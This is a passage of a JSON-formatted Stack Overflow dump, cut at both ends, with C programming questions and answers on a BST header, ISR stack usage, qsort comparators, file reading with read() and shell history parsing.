_BST_H_\n#define _BST_H_\n\n// The definition of the tree structure\ntypedef struct TreeNode_st {\n    char *word;                   // the word held in this node\n    unsigned int frequency;       // how many times it has been seen\n    struct TreeNode_st *left;     // node's left child\n    struct TreeNode_st *right;    // node's right child\n} TreeNode;\n\n// FUNCTIONS ARE REQUIRED TO IMPLEMENT\n\n// insert_word() \n//     Dynamically build BST by allocating nodes from the heap\n//\n// args -\n//        root - a pointer to the pointer to the root of the tree\n//               to build this tree on to.\n//        word - string containing the word to be inserted\n\nvoid insert_word( TreeNode** root, const char *word );\n\n// traverse_tree()\n//    Recursively traverses the tree and prints the value of each\n//    node.\n//\n// args -\n//        root - a pointer to the root of the tree to traverse\n\nvoid traverse_tree( const TreeNode* root );\n\n// cleanup_tree()\n//    Cleanup all memory management associated with the nodes on the heap\n//\n// args\n//      root - the current root of the tree\n\n void cleanup_tree( TreeNode* root );\n\n #endif // BST_H\n</code></pre>\n\n<p>This is the input file (named input.1):</p>\n\n<pre>\nThis is one input line.\nThis is another input line, don't you agree?\nAnother input line, don't you agree?\nThis is yet another input line, don't you agree?\nI think we need this additional line for the road.\n</pre>\n\n<p>Compile Commands:</p>\n\n<pre>\nroot@comp:~/Desktop/Homeworks/5$ gcc -ggdb -std=c99 -Wall -Wextra -pedantic  -c wordFreq.c\nroot@comp:~/Desktop/Homeworks/5$ gcc -ggdb -std=c99 -Wall -Wextra -pedantic -o wordFreq wordFreq.o  -lm\n</pre>\n\n<p>Valgrind Test: I also tested the code in valgrind using the command: </p>\n\n<p>I got no errors... here's the link to test on <strong>page 2</strong>: \n<a href=\"https://docs.google.com/document/d/18qr-4yekRH2dZuCo-6oj0o6_VmMyB4svbLtsIo_cFsM/edit?usp=sharing\" rel=\"nofollow\">Valgrind Test Link</a></p>\n"}, {"tags": ["c++", "c", "function", "portaudio", "isr"], "comments": [{"owner": {"reputation": 3125, "user_id": 2878796, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8bxWv.png?s=128&g=1", "display_name": "UnholySheep", "link": "https://stackoverflow.com/users/2878796/unholysheep"}, "edited": false, "score": 0, "creation_date": 1476309149, "post_id": 40008714, "comment_id": 67296080, "body": "I&#39;d venture a guess and say that the problem might be that you could get a lot of ISRs before each individual callback ends, meaning you&#39;d be allocating stack space for all of them which could cause a stack overflow"}], "answers": [{"tags": [], "owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "is_accepted": false, "score": 1, "last_activity_date": 1476310003, "last_edit_date": 1476310003, "creation_date": 1476309694, "answer_id": 40009101, "question_id": 40008714, "link": "https://stackoverflow.com/questions/40008714/does-each-function-and-isr-get-allocated-its-own-stack-size/40009101#40009101", "title": "Does each function and ISR get allocated its own stack size", "body": "<blockquote>\n  <p>If this callback is actually called from an ISR, is calling more functions from the ISR a problem?</p>\n</blockquote>\n\n<p>It could be.  There are many flavors of ISR, used in many contexts, and some combinations afford fairly limited stack space to the ISR.  Stack space is used by (at least) the ISR's own parameters and local variables and those of every function it calls, directly or indirectly, with some overhead for function calls.  That space gets reused for sequential function calls, but it is cumulative when one function calls another.</p>\n\n<blockquote>\n  <p>As I call each function, will this allow me extra stack space because each function has its own maximum stack size?</p>\n</blockquote>\n\n<p>No, generally not.  An ISR will quite possibly be called with its own stack space, separate from that of any program with which it is associated, but that's a special case.  Functions ordinarily use the same stack as their callers, but ISRs do not <em>have</em> callers in the conventional sense.</p>\n\n<blockquote>\n  <p>I always thought that functions and ISRs can use as much stack stack space as they like up to the complete allocated stack. Does it mean the main function has a larger portion of the stack than others[?]</p>\n</blockquote>\n\n<p>An ISR can use as much as it likes <em>of the stack space provided to it</em>.  That space often is separate from the associated program's main stack, which can be useful for avoiding interfering with the main program's state when the ISR is triggered, and is essential when the ISR is asynchronous.  When separate, the ISR's stack is often much smaller.</p>\n\n<p>The size of a process's (main) stack depends on the system and sometimes the executable; it is shared among <code>main</code> and all the functions called directly or indirectly from <code>main</code>.  In single-threaded programs, <code>main</code> <em>does</em> have access to more stack than any other function <code>f</code>, but the primary reason for that is <code>main</code> and (generally) every function in the call chain from <code>main</code> to <code>f</code> occupies stack space that <code>f</code> cannot use.</p>\n"}, {"comments": [{"owner": {"reputation": 3037, "user_id": 4768946, "user_type": "registered", "accept_rate": 14, "profile_image": "https://www.gravatar.com/avatar/dca1cd14f29e197b1547ac5127218d95?s=128&d=identicon&r=PG&f=1", "display_name": "Engineer999", "link": "https://stackoverflow.com/users/4768946/engineer999"}, "edited": false, "score": 0, "creation_date": 1476348288, "post_id": 40010481, "comment_id": 67309609, "body": "Thanks. Does the ISR always execute with interrupts blocked though?"}], "tags": [], "owner": {"reputation": 6882, "user_id": 3403834, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/xpA5S.jpg?s=128&g=1", "display_name": "user58697", "link": "https://stackoverflow.com/users/3403834/user58697"}, "is_accepted": false, "score": 0, "last_activity_date": 1476318810, "creation_date": 1476318810, "answer_id": 40010481, "question_id": 40008714, "link": "https://stackoverflow.com/questions/40008714/does-each-function-and-isr-get-allocated-its-own-stack-size/40010481#40010481", "title": "Does each function and ISR get allocated its own stack size", "body": "<p>Honestly I wouldn't trust \"another forum\".</p>\n\n<p>The documentation says nothing about using too much <em>stack space</em>. It talks about too much <em>code</em>, and in context of an ISR callbacks it means spending too much <em>time</em> in the ISR.</p>\n\n<p>The ISR (including callbacks) executes with interrupts blocked. Now interrupts do not accumulate; a controller may only say if the interrupt is pending. If the ISR takes too long to execute, interrupts raised during its execution are lost.</p>\n\n<p>Stack space might be an issue as well, but first and foremost, make your callback fast.</p>\n"}, {"comments": [{"owner": {"reputation": 3037, "user_id": 4768946, "user_type": "registered", "accept_rate": 14, "profile_image": "https://www.gravatar.com/avatar/dca1cd14f29e197b1547ac5127218d95?s=128&d=identicon&r=PG&f=1", "display_name": "Engineer999", "link": "https://stackoverflow.com/users/4768946/engineer999"}, "edited": false, "score": 0, "creation_date": 1476347925, "post_id": 40011049, "comment_id": 67309378, "body": "Thanks for that. In the case of a micro controller with just one thread and no OS, what determines the stack size for each ISR ?"}, {"owner": {"reputation": 16850, "user_id": 172642, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0a2a18a04255beea3beff827eecedd64?s=128&d=identicon&r=PG", "display_name": "gavinb", "link": "https://stackoverflow.com/users/172642/gavinb"}, "reply_to_user": {"reputation": 3037, "user_id": 4768946, "user_type": "registered", "accept_rate": 14, "profile_image": "https://www.gravatar.com/avatar/dca1cd14f29e197b1547ac5127218d95?s=128&d=identicon&r=PG&f=1", "display_name": "Engineer999", "link": "https://stackoverflow.com/users/4768946/engineer999"}, "edited": false, "score": 0, "creation_date": 1476355409, "post_id": 40011049, "comment_id": 67314358, "body": "Simply put - the available RAM, minus the program text (static data) and data (application binary) segments, and the heap. It does depend on the language and compiler, but usually the heap grows up from the bottom and the stack grows down. This article has a good diagram: <a href=\"https://www.quora.com/What-is-the-logical-explanation-for-stacks-typically-growing-downward-and-heaps-growing-upward\" rel=\"nofollow noreferrer\">quora.com/&hellip;</a>"}], "tags": [], "owner": {"reputation": 16850, "user_id": 172642, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0a2a18a04255beea3beff827eecedd64?s=128&d=identicon&r=PG", "display_name": "gavinb", "link": "https://stackoverflow.com/users/172642/gavinb"}, "is_accepted": false, "score": 1, "last_activity_date": 1476323772, "creation_date": 1476323772, "answer_id": 40011049, "question_id": 40008714, "link": "https://stackoverflow.com/questions/40008714/does-each-function-and-isr-get-allocated-its-own-stack-size/40011049#40011049", "title": "Does each function and ISR get allocated its own stack size", "body": "<blockquote>\n  <p>I was wondering why would there be an issue with stack space if more code is wrote in an ISR than in the main function.</p>\n</blockquote>\n\n<p>Stack space is probably not the primary concern for an ISR. An ISR should be as simple and fast as possible in order to minimise latency, so it shouldn't <em>need</em> a large stack anyway.  If you have to do any non-trivial processing, your ISR should enqueue a task to run on a regular thread later to complete the job (sometimes called top-half and bottom-half). This could be achieved with a condition variable, semaphore, or message queue (to name a few IPC mechanisms). So if an ISR is using a lot of stack, it may be an indication that it's trying to do too much processing during a timing-critical scheduling period.</p>\n\n<p>Also, many systems (e.g. RTOS) require you to declare the stack size for threads and ISRs.</p>\n\n<blockquote>\n  <p>I wish to call a few different functions from the callback. If this callback is actually called from an ISR, is calling more functions from the ISR a problem?</p>\n</blockquote>\n\n<p>Only in so far as calling other functions from an ISR should be minimised as discussed above. You <em>can</em> call other functions, but you <em>should</em> defer as much as possible to run <em>after</em> the ISR has returned to the kernel scheduler (and unmasked interrupts!).</p>\n\n<p>Also - beware of race conditions! Careful use of mutexes is necessary to protect shared state.</p>\n\n<blockquote>\n  <p>As I call each function, will this allow me extra stack space because each function has its own maximum stack size? This I find a bit confusing.</p>\n</blockquote>\n\n<p>No - a function doesn't have its own stack size - threads do.  For ISRs, it depends on the OS.  Calling each function will <em>consume</em> more stack space though (based on the call nesting level).</p>\n\n<blockquote>\n  <p>I always thought that functions and ISRs can use as much stack stack space as they like up to the complete allocated stack.</p>\n</blockquote>\n\n<p>Yes, but the stack is per-thread, not per-process like the heap. Using a large amount of stack space could be a sign of a design issue: allocating large objects on the stack rather than the heap, too many nested function calls, etc.</p>\n\n<blockquote>\n  <p>Does it mean the main function has a larger portion of the stack than others.</p>\n</blockquote>\n\n<p>No, since the stack is per <em>thread</em>. A <code>main</code> function will be at the bottom of the application's call stack, but it may consume a small or a large amount of stack, depending only on its local variables.</p>\n\n<p>Some good reading:</p>\n\n<ul>\n<li><a href=\"https://en.wikipedia.org/wiki/Call_stack\" rel=\"nofollow\">Call Stack</a></li>\n</ul>\n"}, {"tags": [], "owner": {"reputation": 39, "user_id": 11070547, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5743d2e237f97a1dafa51f383f9d1f20?s=128&d=identicon&r=PG", "display_name": "Erik", "link": "https://stackoverflow.com/users/11070547/erik"}, "is_accepted": false, "score": 0, "last_activity_date": 1550302567, "creation_date": 1550302567, "answer_id": 54720921, "question_id": 40008714, "link": "https://stackoverflow.com/questions/40008714/does-each-function-and-isr-get-allocated-its-own-stack-size/54720921#54720921", "title": "Does each function and ISR get allocated its own stack size", "body": "<blockquote>\n  <p>It came about as I was writing C++ code on Windows using the port audio libraries.</p>\n</blockquote>\n\n<p>Please do as little as possible in the ISR and queue a DPC to call all of your functions.  Even DPCs are or should be resource constrained so consider a design where a worker thread services the DPC.  Whatever you do, don't even think about acquiring any mutexes in an ISR.  EOR. </p>\n"}], "owner": {"reputation": 3037, "user_id": 4768946, "user_type": "registered", "accept_rate": 14, "profile_image": "https://www.gravatar.com/avatar/dca1cd14f29e197b1547ac5127218d95?s=128&d=identicon&r=PG&f=1", "display_name": "Engineer999", "link": "https://stackoverflow.com/users/4768946/engineer999"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 615, "favorite_count": 0, "answer_count": 4, "score": 0, "last_activity_date": 1550302567, "creation_date": 1476307963, "question_id": 40008714, "link": "https://stackoverflow.com/questions/40008714/does-each-function-and-isr-get-allocated-its-own-stack-size", "title": "Does each function and ISR get allocated its own stack size", "body": "<p>I'd assume this question is Operating System or platform dependant. </p>\n\n<p>It came about as I was writing C++ code on Windows using the port audio libraries.</p>\n\n<p>It stated in the documentation not to write too much code in my callback function that will be passed to the port audio engine, because depending on the system, it could be called from an ISR and from reading on another forum, stating that it can cause a stack overflow.</p>\n\n<p>I'm not here to ask about anything port audio specific, but I was wondering why would there be an issue with stack space if more code is wrote in an ISR than in the main function. </p>\n\n<p>I wish to call a few different functions from the callback. If this callback is actually called from an ISR, is calling more functions from the ISR a problem? </p>\n\n<p>As I call each function, will this allow me extra stack space because each function has its own maximum stack size? This I find a bit confusing.</p>\n\n<p>I always thought that functions and ISRs can use as much stack stack space as they like up to the complete allocated stack. Does it mean the main function has a larger portion of the stack than others.</p>\n\n<p>Many thanks in advance.</p>\n"}, {"tags": ["c", "algorithm", "struct", "qsort"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1476307042, "post_id": 40008423, "comment_id": 67295147, "body": "You forgot to <code>#include &lt;stdlib.h&gt;</code> which won&#39;t help. Please maximise the compiler warnings."}], "answers": [{"comments": [{"owner": {"reputation": 177, "user_id": 2737948, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/1523792fcf948ab512279c228e88cbea?s=128&d=identicon&r=PG&f=1", "display_name": "user2737948", "link": "https://stackoverflow.com/users/2737948/user2737948"}, "edited": false, "score": 0, "creation_date": 1476307949, "post_id": 40008460, "comment_id": 67295588, "body": "I understand that I need to change it in order to accept any type of input but when I changed it I receive this warning: redefinition of &#39;a&#39; with a different type: &#39;const struct Dolls *&#39; vs &#39;const void *&#39;"}, {"owner": {"reputation": 177, "user_id": 2737948, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/1523792fcf948ab512279c228e88cbea?s=128&d=identicon&r=PG&f=1", "display_name": "user2737948", "link": "https://stackoverflow.com/users/2737948/user2737948"}, "edited": false, "score": 0, "creation_date": 1476308532, "post_id": 40008460, "comment_id": 67295829, "body": "Oh I found the error the variable name a was used twice in a single scope. Changing const struct Dolls *va = a, fixed the mistake."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1476314922, "post_id": 40008460, "comment_id": 67297887, "body": "Much better compare!"}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": true, "score": 5, "last_activity_date": 1476363758, "last_edit_date": 1476363758, "creation_date": 1476306857, "answer_id": 40008460, "question_id": 40008423, "link": "https://stackoverflow.com/questions/40008423/using-qsort-with-a-define-struct/40008460#40008460", "title": "Using qsort with a define struct", "body": "<p>Your <code>cmp</code> function needs to be defined as <code>int (*)(const void *, const void *)</code> for it to work for <code>qsort</code>.</p>\n\n<p>The way you're performing the comparisons is also not correct.  From the man page for qsort:</p>\n\n<blockquote>\n  <p>The comparison function must return an integer less than, equal to, \n  or greater  than  zero  if  the first argument is considered to be\n  respec- tively less than, equal to, or greater than the second.  If\n  two members compare as equal, their order in the sorted array is\n  undefined.</p>\n</blockquote>\n\n<p>The comparisons you're doing return the result of the <code>&lt;</code> or <code>&gt;</code> operators, which is either 0 or 1.  You need to explicitly check each case and return the proper value.</p>\n\n<pre><code>int cmp(const void *va, const void *vb){\n  const struct Dolls *a = va;\n  const struct Dolls *b = vb;\n\n  if(a-&gt;w &gt; b-&gt;w) {\n      return 1;\n  } else if(a-&gt;w &lt; b-&gt;w){\n      return -1;\n  } else if(a-&gt;h &gt; b-&gt;h) {\n      return 1;\n  } else if(a-&gt;h &lt; b-&gt;h){\n      return -1;\n  } else {\n    return 0;\n  }\n}\n</code></pre>\n\n<p>As for the call to <code>qsort</code>, you need to give it the size of an array element, i.e. the whole struct, not the size of the subfield:</p>\n\n<pre><code>qsort(array,n,sizeof(struct Dolls),cmp);\n</code></pre>\n\n<p>EDIT:</p>\n\n<p>Fixed the error with the parameter names.  Also changed how the sort is performed to conform to how the comparison function must behave.</p>\n"}], "owner": {"reputation": 177, "user_id": 2737948, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/1523792fcf948ab512279c228e88cbea?s=128&d=identicon&r=PG&f=1", "display_name": "user2737948", "link": "https://stackoverflow.com/users/2737948/user2737948"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 285, "favorite_count": 0, "accepted_answer_id": 40008460, "answer_count": 1, "score": 1, "last_activity_date": 1476363758, "creation_date": 1476306663, "question_id": 40008423, "link": "https://stackoverflow.com/questions/40008423/using-qsort-with-a-define-struct", "title": "Using qsort with a define struct", "body": "<p>I'm learning C and I'm solving <a href=\"https://uva.onlinejudge.org/index.php?option=onlinejudge&amp;page=show_problem&amp;problem=2353\" rel=\"nofollow\">this challenge</a>, I'm not planning to submit it to the uva platform and the reason I'm coding this exercise is for leaning, maybe is not the best approach to the problem but I'm trying. </p>\n\n<p>The input I print in my terminal is the following:</p>\n\n<pre><code>4\n3\n20 30 40 50 30 40\nRes: 2\n4 \n20 30 10 10 30 20 40 50\nRes: 4\n3\n10 30 20 20 30 10\nRes: 2\n4\n10 10 20 30 40 50 39 51\nRes: 3\n</code></pre>\n\n<p>The answers from each input test are incorrect and I believe the reason is the qsort function. I'm confuse about how to use the qsort function using a structure, I'm calling my structure that is called array, followed by the size of my input, then using sizeof(int) but do I need to use int or sizeof my structure, lastly I'm calling my compare function. My code is:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nstruct Dolls{\n  int w;\n  int h;\n}array[20005];\n\nint cmp(struct Dolls a, struct Dolls b){\n  if(a.w==b.w){\n    return a.h &lt; b.h;\n  }else{\n    return a.w &gt; b.w;\n  }\n}\n\nint arr[20005];\nint dp[20005];\nint n;\n\nint bSearch(int num, int k){\n  int low=1;\n  int high = k;\n  int mid;\n  while(low&lt;= high){\n    mid = (low+high)/2;\n    if(num&gt;=dp[mid]){\n      low=mid+1;\n    }else{\n      high=mid-1;\n    }\n  }\n  return low;\n}\n\nint res_dolls(){\n  int k=1;\n  int i,pos;\n  dp[i]=arr[1];\n  for(i=2;i&lt;=n;i++){\n    if(arr[i]&gt;=dp[k]){\n      dp[++k] = arr[i];\n    }else{\n      pos = bSearch(arr[i],k);\n      dp[pos] = arr[i];\n    }\n  }\n  return k;\n}\n\nint main(){\n  int t,j;\n  scanf(\"%d\",&amp;t);\n  while(t--){\n    memset(array,0,sizeof(array));\n    scanf(\"%d\",&amp;n);\n    for(j=1;j&lt;=n;j++){\n      scanf(\"%d %d\",&amp;array[j].w, &amp;array[j].h);\n    }\n    qsort(array,n,sizeof(int),cmp);\n    for(j=1;j&lt;=n;j++){\n      arr[j] = array[j].h;\n    }\n    printf(\"%d\\n\",res_dolls());\n  }\n  return 0;\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "edited": false, "score": 2, "creation_date": 1476309082, "post_id": 40008377, "comment_id": 67296052, "body": "Every time you open the file, the file pointer is reset."}, {"owner": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "edited": false, "score": 0, "creation_date": 1476309325, "post_id": 40008377, "comment_id": 67296162, "body": ".. Ah \u2013 what is <code>index</code> supposed to indicate? &quot;The next position of a <code>size</code> block to read&quot;?"}], "answers": [{"tags": [], "owner": {"reputation": 126343, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "is_accepted": true, "score": 1, "last_activity_date": 1476309653, "creation_date": 1476309653, "answer_id": 40009094, "question_id": 40008377, "link": "https://stackoverflow.com/questions/40008377/read-c-function/40009094#40009094", "title": "Read C function", "body": "<p>The problem, <a href=\"https://stackoverflow.com/questions/40008377/read-c-function#comment67296052_40008377\">correctly identified by @RadLexus</a>, is you're reopening the file every time you call <code>addChunk</code>.</p>\n\n<p>File handles, file pointers, file numbers all work basically the same way: they all act like cursors in an editor. When you open a file for reading, the file handle is at the start. When you read from the file handle, the cursor moves through the file holding your place. When you close the file handle, the cursor is thrown out. When you open it again, it starts at the beginning of the file again.</p>\n\n<p>Since you're reopening the file every time you call <code>addChunk</code> you're re-reading from the start of the file again. Your use of the global variable <code>sString</code> should have tipped you off that something was wrong. Globals are just about always a sign of a poorly designed function.</p>\n\n<p>Instead, open the file outside of <code>addChunk</code> and pass in the file handle. This will fix the re-opening problem, and <code>addChunk</code> will be able to be used on other files without having to change a global variable and possibly mess up some other code.</p>\n\n<pre><code>#include &lt;errno.h&gt;\n#include &lt;string.h&gt;\n\nint fd = open(sString, O_RDONLY);\nif( fd &lt; 0 ) {\n    fprintf(stderr, \"Can't open '%s' for reading: %s\\n\", sString, strerror(errno));\n    exit(1);\n}\n\n/* Read two chunks into buffer */\naddChunk(fdIn, buffer, size);\naddChunk(fdIn, buffer, size);\n\nclose(fd);\n</code></pre>\n"}], "owner": {"reputation": 31, "user_id": 6891117, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2d130e9cca8c5eccd7b2dae2a1fa82a3?s=128&d=identicon&r=PG&f=1", "display_name": "BoredPerson", "link": "https://stackoverflow.com/users/6891117/boredperson"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 162, "favorite_count": 0, "accepted_answer_id": 40009094, "answer_count": 1, "score": 0, "last_activity_date": 1476309653, "creation_date": 1476306474, "last_edit_date": 1476308978, "question_id": 40008377, "link": "https://stackoverflow.com/questions/40008377/read-c-function", "title": "Read C function", "body": "<p>So I am writing a function that reads from a file, and places the bytes into a temp buffer. Then writes it to the param buffer at an offset. </p>\n\n<p>I may be understanding read wrong, but I want to read, every time the function is called, the next \"size\" of bytes in the file should be read. But it is reading the same 1024 bytes every time.. I have a feeling this is because of the scope, how do i fix or that I need to put an a offset?</p>\n\n<p>Also is there any way for check how many characters were read, when read hits EOF?</p>\n\n<pre><code>   int addChunk(char* buffer, int size, int index){\n    char buf[size + 1];\n    int fdIn, cnt, i;\n    //int count = 0;\n\n    if (argcG &lt; 2) {\n        fdIn = 0;  \n    }   \n    else if ((fdIn = open(sString, O_RDONLY)) &lt; 0) {\n        fprintf(stderr, \"file open: %s\\n\", sString);\n        exit(1);\n    }\n\n    cnt = read(fdIn, buf, size);\n    if(cnt == 0){\n        buf[size] == '\\0';\n        close(fdIn); \n    }\n\n   // if (fdIn &gt; 0){\n        //??\n    //} \n\n\n    for(int i = 0; i &lt; ((cnt == 0)? size : cnt); i++){\n        if(buf[i] == '\\0'){\n            break;\n        }\n        printf(\"%02X\",buf[i]);\n    }\n    printf(\"\\n\");\n\n    /* for(int i = (index * size) - 1; i &lt; size; i++){\n        buffer[i] = buf[j];\n        j++;\n    } \n     */\n    printf(\"Counted %d bytes \\n\", cnt);\n    return cnt;\n}\n</code></pre>\n"}, {"tags": ["c", "shell", "unix"], "comments": [{"owner": {"reputation": 2137, "user_id": 1212725, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/152c2f757fe98760a1cca54a21f63a31?s=128&d=identicon&r=PG", "display_name": "bruceg", "link": "https://stackoverflow.com/users/1212725/bruceg"}, "edited": false, "score": 0, "creation_date": 1476305404, "post_id": 40008060, "comment_id": 67294208, "body": "<code>args[0][0]</code> is the first character of the first string in the args array, so it&#39;s subtracting the ascii code for &#39;!&#39; from it"}, {"owner": {"reputation": 152277, "user_id": 438992, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/QouOz.jpg?s=128&g=1", "display_name": "Dave Newton", "link": "https://stackoverflow.com/users/438992/dave-newton"}, "edited": false, "score": 0, "creation_date": 1476305416, "post_id": 40008060, "comment_id": 67294217, "body": "It&#39;s subtracting, exactly what it looks like-is your question about what ASCII is?"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1476305976, "post_id": 40008060, "comment_id": 67294533, "body": "The first argument <code>argv[0]</code> is usually the executable filename itself. But AFAIK <code>exec**</code> functions do not pass any program argument, so this could be such usage."}, {"owner": {"reputation": 55, "user_id": 3385560, "user_type": "registered", "accept_rate": 57, "profile_image": "https://graph.facebook.com/100000120198279/picture?type=large", "display_name": "user3385560", "link": "https://stackoverflow.com/users/3385560/user3385560"}, "edited": false, "score": 0, "creation_date": 1476306205, "post_id": 40008060, "comment_id": 67294649, "body": "thanks. I didn&#39;t realize that this was about subtracting ascii hehe"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 3, "creation_date": 1476307180, "post_id": 40008060, "comment_id": 67295224, "body": "Technically, it&#39;s not about subtracting ASCII specifically.  It is about subtracting character codes, but whether the codes used are related to ASCII is implementation-dependent."}], "answers": [{"tags": [], "owner": {"reputation": 18850, "user_id": 999530, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/YGip7.png?s=128&g=1", "display_name": "Travis Griggs", "link": "https://stackoverflow.com/users/999530/travis-griggs"}, "is_accepted": false, "score": 3, "last_activity_date": 1476306696, "last_edit_date": 1476306696, "creation_date": 1476305501, "answer_id": 40008142, "question_id": 40008060, "link": "https://stackoverflow.com/questions/40008060/i-dont-understand-what-args00-means/40008142#40008142", "title": "I don&#39;t understand what args[0][0]-&#39;!&#39; means", "body": "<p><code>args</code> is a <code>char**</code>, or in other words, an array of strings (character arrays). So:</p>\n\n<pre><code>args[0]             // first string in args\nargs[0][0]          // first character of first string in args\nargs[0][0]-'!'      // value of subtracting the character value of ! from\n                    // the first character in the first string in args\nargs[0][0]-'!' == 0 // is said difference equal to zero\n</code></pre>\n\n<p>In other words, it checks if the first string in <code>args</code> starts with the <code>!</code> character.</p>\n\n<p>It could (and arguably should) be rewritten as</p>\n\n<pre><code>args[0][0] == '!'\n</code></pre>\n\n<p>As well as (but don't use this one):</p>\n\n<pre><code>**args == '!'\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 124806, "user_id": 121747, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/9fcebb68b105446c0d9eebbce1146044?s=128&d=identicon&r=PG&f=1", "display_name": "Jack", "link": "https://stackoverflow.com/users/121747/jack"}, "is_accepted": false, "score": 3, "last_activity_date": 1476305524, "creation_date": 1476305524, "answer_id": 40008151, "question_id": 40008060, "link": "https://stackoverflow.com/questions/40008060/i-dont-understand-what-args00-means/40008151#40008151", "title": "I don&#39;t understand what args[0][0]-&#39;!&#39; means", "body": "<p><code>'!'</code> is just a textual representation of a numerical value which encodes the exclamation mark in a specified encoding. <code>args[0][0]</code> is the first character of the first element of the array. </p>\n\n<p>So when <code>x - y == 0</code>? Move <code>y</code> on the other side, when <code>x == y</code>, so that code is equivalent to <code>args[0][0] == '!'</code>.</p>\n\n<p>I don't see any practical reason to express the equivalence as a subtraction in the example though.</p>\n"}], "owner": {"reputation": 55, "user_id": 3385560, "user_type": "registered", "accept_rate": 57, "profile_image": "https://graph.facebook.com/100000120198279/picture?type=large", "display_name": "user3385560", "link": "https://stackoverflow.com/users/3385560/user3385560"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 297, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1476306696, "creation_date": 1476305191, "last_edit_date": 1476306505, "question_id": 40008060, "link": "https://stackoverflow.com/questions/40008060/i-dont-understand-what-args00-means", "title": "I don&#39;t understand what args[0][0]-&#39;!&#39; means", "body": "<p>I stumbled upon this  block of code and I want to understand what\n<code>args[0][0]-'!'</code> means?</p>\n\n<pre><code>else if (args[0][0]-'!' ==0)\n{   int x = args[0][1]- '0'; \n    int z = args[0][2]- '0'; \n\n    if(x&gt;count) //second letter check\n    {\n    printf(\"\\nNo Such Command in the history\\n\");\n    strcpy(inputBuffer,\"Wrong command\");\n    } \n    else if (z!=-48) //third letter check\n    {\n    printf(\"\\nNo Such Command in the history. Enter &lt;=!9 (buffer size        is 10 along with current command)\\n\");\n    strcpy(inputBuffer,\"Wrong command\");\n    }\n    else\n    {\n\n        if(x==-15)//Checking for '!!',ascii value of '!' is 33.\n        {    strcpy(inputBuffer,history[0]);  // this will be your 10 th(last) command\n        }\n        else if(x==0) //Checking for '!0'\n        {    printf(\"Enter proper command\");\n            strcpy(inputBuffer,\"Wrong command\");\n        }\n\n        else if(x&gt;=1) //Checking for '!n', n &gt;=1\n        {\n            strcpy(inputBuffer,history[count-x]);\n\n        }\n\n    }\n</code></pre>\n\n<p>This code is from this github account:  <a href=\"https://github.com/deepakavs/Unix-shell-and-history-feature-C/blob/master/shell2.c\" rel=\"nofollow\">https://github.com/deepakavs/Unix-shell-and-history-feature-C/blob/master/shell2.c</a></p>\n"}, {"tags": ["c", "clang", "llvm", 